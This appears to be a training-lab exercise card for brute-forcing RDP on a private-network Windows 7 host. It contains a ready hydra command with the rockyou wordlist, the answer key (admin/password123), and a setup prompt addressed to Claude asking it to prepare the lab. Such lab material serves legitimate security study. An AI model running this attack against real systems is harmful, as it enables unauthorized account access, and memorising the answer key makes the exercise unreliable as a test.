# Q273 — Brute Force RDP Using Hydra

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.130` (Windows 7) |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 10–15 min |

---

## 📝 Question

"Brute force RDP on Windows 7 target. Use username `admin` and a custom wordlist."

---

## 🎯 Flag Format

```
user=<username>; password=<pass>
```

---

## ✅ Solution

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.52.130 rdp -t 4
```

**Answer:** `user=admin; password=password123`

---

## 🤖 Claude Setup Prompt

Ensure RDP (port 3389) enabled on Win7 with user admin:password123. Report back: "Lab ready for Q273"
